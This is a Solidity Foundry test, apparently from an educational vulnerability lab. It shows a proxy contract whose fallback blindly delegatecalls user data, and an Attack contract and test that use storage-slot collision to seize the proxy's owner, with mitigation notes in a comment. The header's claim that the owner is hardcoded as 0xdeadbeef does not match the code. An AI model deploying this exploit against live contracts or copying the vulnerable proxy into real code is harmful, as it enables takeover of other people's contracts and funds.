// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

/*
Name: Unsafe Delegatecall Vulnerability

Description:
The Proxy Contract Owner Manipulation Vulnerability is a flaw in the smart contract design that
allows an attacker to manipulate the owner of the Proxy contract, which is hardcoded as 0xdeadbeef.
The vulnerability arises due to the use of delegatecall in the fallback function of the Proxy contract. 
delegatecall allows an attacker to invoke the pwn() function from the Delegate contract within the context 
of the Proxy contract, thereby changing the value of the owner state variable of the Proxy contract.
This allows a smart contract to dynamically load code from a different address at runtime.

Scenario:
Proxy Contract is designed for helping users call logic contract
Proxy Contract's owner is hardcoded as 0xdeadbeef
Can you manipulate Proxy Contract's owner ?

Mitigation:
To mitigate the Proxy Contract Owner Manipulation Vulnerability, 
avoid using delegatecall unless it is explicitly required, and ensure that the delegatecall is used securely. 
If the delegatecall is necessary for the contract's functionality, make sure to validate and 
sanitize inputs to avoid unexpected behaviors.
*/

contract Proxy {
    Delegate delegate;
    address public owner;
    uint public num;

    constructor(address _delegateAddress) public {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool suc, ) = address(delegate).delegatecall(msg.data); // vulnerable
        require(suc, "Delegatecall failed");
    }
}

contract Attack {
    Delegate delegate;
    address public owner;
    uint public num;

    Proxy public proxy;

    constructor(address _proxy) public {
        proxy = Proxy(_proxy);
    }

    function attack() external {
        address(proxy).call(
            abi.encodeWithSignature(
                "pwn(uint256)",
                uint(uint160(address(this)))
            )
        );
        //address(proxy).call(abi.encodeWithSignature("pwn(uint256)", 1));
    }

    function pwn(uint _num) public {
        owner = msg.sender;
    }
}

contract ContractTest is Test {
    Proxy proxy;
    Delegate DelegateContract;
    Attack attack;
    address alice;
    address bob;

    function setUp() public {
        alice = vm.addr(1);
        bob = vm.addr(2);
    }

    function testDelegatecall() public {
        DelegateContract = new Delegate(); // logic contract
        vm.prank(alice);
        proxy = new Proxy(address(DelegateContract)); // proxy contract
        attack = new Attack(address(proxy)); // attack contract

        console.log("Alice address", alice);
        console.log("Proxy owner", proxy.owner());

        // Delegatecall allows a smart contract to dynamically load code from a different address at runtime.
        console.log("Change DelegationContract owner to bob...");

        //address(attack).call(abi.encodeWithSignature("pwn(uint256)", _num)); // exploit here
        // Proxy.fallback() will delegatecall Delegate.pwn()
        //address(attack).call(abi.encodeWithSignature("attack()"));
        attack.attack();
        vm.prank(bob);
        address(proxy).call(abi.encodeWithSignature("pwn(uint256)", 1));

        console.log("Proxy owner", proxy.owner());
        console.log(
            "Exploit completed, proxy contract storage has been manipulated"
        );
    }
}

contract Delegate {
    uint public num; // slot0

    function pwn(uint _num) public {
        num = _num;
    }
}
